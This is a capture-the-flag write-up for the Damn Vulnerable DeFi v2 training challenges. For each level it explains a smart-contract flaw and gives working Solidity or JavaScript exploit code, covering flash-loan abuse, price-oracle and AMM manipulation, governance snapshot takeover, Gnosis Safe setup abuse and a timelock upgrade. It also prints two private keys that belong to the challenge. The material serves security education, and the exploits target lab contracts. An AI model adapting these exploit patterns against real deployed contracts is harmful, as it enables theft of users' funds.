# Damn Vulnerable Defi v2 Write-Up

### Unstoppable
The objective of this challenge is:
- To stop `UnstoppableLender` contract from offering flash loans.
  
When `flashLoan()` function in `UnstoppableLender` contract is called, it `assert(poolBalance == balanceBefore)`. 
The contract assumes the tokens can only be transferred via `depositTokens()` function. However, since DVT token is an ERC-20 token, it has native functionalities to transfer tokens to other users. Since `poolBalance` only updates by `depositTokens()` function, the challenger can transfer their DVT token to `UnstoppableLender` contract with `transfer()` function of ERC20 token contract to prevent `assert(poolBalance == balanceBefore)` condition from ever passing.
```
<!-- Javascript -->
tx = await this.token.connect(attacker).transfer(this.pool.address, 1);
await tx.wait();
```

### Naive receiver
The objective of this challenge is:
- Drain all ethers from `FlashLoanReceiver` contract in a single transaction.
  
Anyone can execute `_receiveEther()` function in `FlashLoanReceiver` contract by calling the `flashLoan()` function in `NaiveReceiverLenderPool` contract and specifying the `FlashLoanReceiver` contract as the `borrower`. Since `FlashLoanReceiver` contract doesn't have any condition checks inside `_executeActionDuringFlashLoan()`, it will always repay try to repay the fee of 1 ether. The challenger can call `flashLoan()` function 10 times with the `borrower` as `FlashLoanReceiver` to drain the 10 ether it owns.
```
<!-- Solidity -->
function exploit(address _pool, address _receiver) external {
    for (uint i = 0; i < 10; i++) {
        NaiveReceiverLenderPool(payable(_pool)).flashLoan(_receiver, 0);
    }
}
```

### Truster
The objective of this challenge is:
- Transfer all DVT tokens from `TrusterLenderPool` to the attacker.
  
The `flashLoan()` function in the `TrusterLenderPool` contract makes an external call with `target.functionCall(data)`. The challenger can pass in `data` that will approve the DVT tokens that `TrusterLenderPool` contract owns to a challenger owned contract.
```
<!-- Solidity -->
function exploit(address _pool) external {
    ITrusterLenderPool(_pool).flashLoan(
        0,
        address(this),
        address(damnValuableToken),
        abi.encodeWithSignature('approve(address,uint256)', address(this), damnValuableToken.balanceOf(_pool))
    );
    damnValuableToken.transferFrom(_pool, msg.sender, damnValuableToken.balanceOf(_pool));
}
```



### Side entrance
The objective of this challenge is:
- Transfer all ethers from `SideEntranceLenderPool` contract to the attacker.
  
The `flashLoan()` function in the `SideEntranceLenderPool` contract makes an external call with `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()`. The challenger can create a contract with an `execute()` function that calls the `deposit()` function of `SideEntraceLenderPool` contract and send the borrowed ether to `SideEntranceLenderPool` contract. Since `flashLoan()` checks whether the ether has been returned with `require(address(this).balance >= balanceBefore)`, the ether will reside in the `SideEntranceLenderPool`, but be withdrawable by the challenger.
```
<!-- Solidity -->
contract SideEntranceExploit {
    using Address for address payable;
    receive() external payable {}
    ISideEntranceLenderPool _pool;
    constructor (address poolAddress) {
        _pool = ISideEntranceLenderPool(poolAddress);
    }
    function exploit() external {
        _pool.flashLoan(address(_pool).balance);
    }
    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }
    function withdraw() external {
        _pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }
}
```

### The rewarder
The objective of this challenge is:
- Issue a significant number of RWT tokens reward for the upcoming round to the attacker.
  
The `distributeRewards()` function in `TheRewarderPool` contract mints the accounting token (rTKN) and distributes reward token (RWT) based on the number of rTKN minted in a single transaction. Since rTKN is minted when DVT tokens are deposited to `TheRewarderPool` contract, the challenger can borrow DVT tokens from `FlashLoanerPool` contract and use the borrowed DVT tokens to call `deposit()` function in the `TheRewarderPool` contract to mint an equivalent number of rTKN to the number of DVT tokens deposited. When rTKN is minted, `TheRewarderPool` will call `distributeRewards()` function that reward RWT tokens to users with rTKN balance. The challenger then calls `withdraw()` function in `TheRewarderPool` contract to withdraw the DVT tokens deposited by burning rTKN. In the end, the challenger owned contract will be left with RWT tokens it was rewarded.
```
<!-- Solidity -->
contract TheRewarderExploit {
    FlashLoanerPool public immutable flpool;
    DamnValuableToken public immutable dvtoken;
    TheRewarderPool public immutable rpool;
    RewardToken public immutable rtoken;


    constructor(address _flashLoanerPool, address _damnValuableToken, address _rewarderPool, address _rewardToken) {
        flpool = FlashLoanerPool(_flashLoanerPool);
        dvtoken = DamnValuableToken(_damnValuableToken);
        rpool = TheRewarderPool(_rewarderPool);
        rtoken = RewardToken(_rewardToken);
    }
    function exploit() external {
        flpool.flashLoan(dvtoken.balanceOf(address(flpool)));
        rtoken.transfer(msg.sender, rtoken.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) external {
        dvtoken.approve(address(rpool), amount);
        rpool.deposit(amount);
        rpool.withdraw(amount);
        dvtoken.transfer(address(flpool), amount);
    }
}
```

### Selfie
The objective of this challenge is:
- Transfer all DVT tokens from `SelfiePool` contract to the attacker.
  
To call `queueAction()` function in `SimpleGovernance` contract, the caller must own more than half the supply of DVT tokens at the last snapshot. Since `DamnValuableTokenSnapshot` contract implements `snapshot()` function that anyone can call, the challenger can call the `snapshot()` function after receiving a flash loan to a temporarily increase its balance for taken snapshot. Having more the half the the supply of DVT tokens during the snapshot, the challenger can arbitrarily execute any action including and most importantly the `drainAllFunds()` function in `SelfiePool` contract.
```
<!-- Solidity -->
contract SelfieExploit {
    SelfiePool public spool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    address private owner;
    
    constructor (address _spool, address _token, address _governance) {
        spool = SelfiePool(_spool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        owner = msg.sender;
    }
    function exploit() external {
        spool.flashLoan(token.balanceOf(address(spool)));
    }
    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        token.snapshot();
        governance.queueAction(
            address(spool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(spool), borrowAmount);
    }
}
```

### Compromised
The objective of this challenge is:
- Transfer all ethers from `Exchange` contract to the attacker.
  
The `Exchange` contract retrieves the price for the NFTs it sells from `TrustfulOracle` contract. The oracle determines the price of the NFT based on the median price of three sources. Although the `TrustfulOracle` and `Exchange` contracts doesn't seem to have any vulnerabilities, however the challenge description includes a response from a web server related to the `Exchange`. Hex decode the response, then base64 decoding the hex decoded repsonse will generate the private key for the two sources used by the oracle. With control of two out of three source, the challenger can manipulate the price of the NFT.
```
<!-- Javascript -->
wallet1 = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider);
tx = await this.oracle.connect(wallet1).postPrice('DVNFT', 0);
wallet2 = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider);
tx = await this.oracle.connect(wallet2).postPrice('DVNFT', 0);
await tx.wait();
tx = await this.exchange.connect(attacker).buyOne({value:1});
await tx.wait();
tx = await this.oracle.connect(wallet1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
await tx.wait();
tx = await this.oracle.connect(wallet2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
await tx.wait();
tx = await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
await tx.wait();
tx = await this.exchange.connect(attacker).sellOne(0);
await tx.wait();
tx = await this.oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE);
await tx.wait();
tx = await this.oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE);
await tx.wait();
```

### Puppet
The objective of this challenge is:
- Transfer all DVT tokens from `PuppetPool` contract to the attacker.
  
The `PuppetPool` contract allows borrowing of DVT tokens by depositing double the borrowing amount in ether. However, it calculates the required deposit with `uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair)`. The challenger can manipulate both `uniswapPair.balance` and `token.balanceOf(uniswapPair)` by buying ether and selling DVT tokens on Uniswap. The ether required as collateral to borrow DVT tokens from `PuppetPool` will be much lower and can be drained with roughly 10 ethers.
```
<!-- Javascript -->
tx = await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
await tx.wait();
deadline = (await ethers.provider.getBlock()).timestamp + 30;
tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), 1, deadline);
await tx.wait();
tx = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('20')});
await tx.wait();
```

### Puppet v2
The objective of this challenge is:
- Transfer all DVT tokens from `PuppetV2Pool` contract to the attacker.
  
The `PuppetV2Pool` contract allows borrowing of DVT tokens bt depositing triple the borrowing amount in wrapped ether. However, since it calculated the required deposit with `UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH)`, the challenger can manipulate both `reservesToken` and `reservesWETH` by selling DVT tokens and buying WETH tokens. The ether required as collateral to borrow from `PuppetV2Pool` will be much lower and can be drained with roughly 20 ethers.
```
<!-- Javascript -->
tx = await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
await tx.wait();
amountIn = ATTACKER_INITIAL_TOKEN_BALANCE;
amountOutMin = 0;
path = [this.token.address, this.weth.address];
to = attacker.address;
deadline = (await ethers.provider.getBlock()).timestamp + 30;
tx = await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline);
await tx.wait();
tx = await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('19.6')});
await tx.wait();
attackerWethBalance = await this.weth.balanceOf(attacker.address);
tx = await this.weth.connect(attacker).approve(this.lendingPool.address, attackerWethBalance);
await tx.wait();
tx = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
await tx.wait();
```


### Free rider
The objective of this challenge is:
- Drain all NFTs and ethers from `FreeRiderNFTMarketplace` contract.
  
The `FreeRiderNFTMarketplace` contract has criticals flaws in the way `buyMany()` function and `_buyOne()` function is implemented and. The `buyMany()` function calls `_buyOne()` function for each NFT, which checks the condition `require(msg.value >= priceToPay, "Amount paid is not enough")`. However because `msg.value` will persist throughout a transaction, the challenger can send `msg.value` required for a single NFT to buy as many NFT available. Furthermore, even though the buyer should be paying the seller `FreeRiderNFTMarketplace` contract, `payable(token.ownerOf(tokenId)).sendValue(priceToPay)` will pay the buyer.
```
<!-- Solidity -->
function exploit(uint amount0Out, uint amount1Out, uint256[] calldata _tokenId) public {
    uint256[] memory tokenIds = _tokenId;
    IUniswapPair(pairAddress).swap(
        amount0Out,
        amount1Out,
        address(this),
        abi.encode(tokenIds)
    );
}

function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    (uint256[] memory tokenIds) = abi.decode(data, (uint256[]));
    IWeth(wethAddress).withdraw(amount0);
    IMarketplace(marketAddress).buyMany{value:amount0}(tokenIds);
    IWeth(wethAddress).deposit{value: 15.05 ether}();
    IWeth(wethAddress).transfer(pairAddress, 15.05 ether);
    for (uint i = 0; i < tokenIds.length; i++) {
        INFT(nftAddress).safeTransferFrom(address(this), buyerAddress, i);
    }
}
```


### Backdoor
The objective of this challenge is:
- Transfer all `WalletRegistry` contract to the attacker.
  
The `WalletRegistry` contract doesn't appear to have any vulnerabilities, but because `GnosisSafe` wallets can make `delegatecall` when created, the challenger can create `GnosisSafe` wallets and have it approve tokens it receives from `WalletRegistry` contract.
```
<!-- Solidity -->
contract BackdoorExploit {
    function exploit(
        address[] calldata _owners,
        address _token,
        address _factory,
        address _singleton,
        IProxyCreationCallback callback,
        address attacker
    ) public {
        for (uint256 i = 0; i < _owners.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = _owners[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(this),
                abi.encodeWithSignature(
                    "approveToken(address,address)",
                    _token,
                    address(this)
                ),
                address(0),
                address(0),
                0,
                address(0)
            );
            address proxy = address(GnosisSafeProxyFactory(_factory).createProxyWithCallback(
                _singleton,
                initializer,
                0,
                callback
            ));
            IERC20(_token).transferFrom(proxy, address(this), 10 ether);
            IERC20(_token).transfer(attacker, 10 ether);
        }
    }
    function approveToken(address _token, address spender) external {
        IERC20(_token).approve(spender, 10 ether);
    }
}
```

### Climber
The objective of this challenge is:
- Transfer all DVT tokens from `ClimberVault` contract to the attacker.

Because of the way `execute()` function is implemented in `ClimberTimelock` contract, any users can make external calls from `ClimberTimelock` contract. In a single transaction, the challenger can grant `PROPSER_ROLE` to a challenger owned, upgrade the `ClimberVault` contract to change `sweepFunds()` function to allow anyone to withdraw the DVT tokens it owns, and schedule all the forementioned actions including the `schedule()` action.
```
contract ClimberVault2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweepFunds(address tokenAddress, address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
    }
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
contract ClimberExploit {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    ClimberVault2 vault2 = new ClimberVault2();
    function exploit(address _timelock, address _vault, address _token, address _recipient) external {
        targets.push(_timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        targets.push(_vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(vault2),
                abi.encodeWithSignature(
                    "sweepFunds(address,address)",
                    _token,
                    _recipient
                )
            )
        );
        targets.push(address(this));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "schedule(address)",
                _timelock
            )
        );
        ClimberTimelock(payable(_timelock)).execute(targets, values, dataElements, bytes32(0));
    }
    function schedule(address _timelock) external {
        ClimberTimelock(payable(_timelock)).schedule(targets, values, dataElements, bytes32(0));
    }
}
```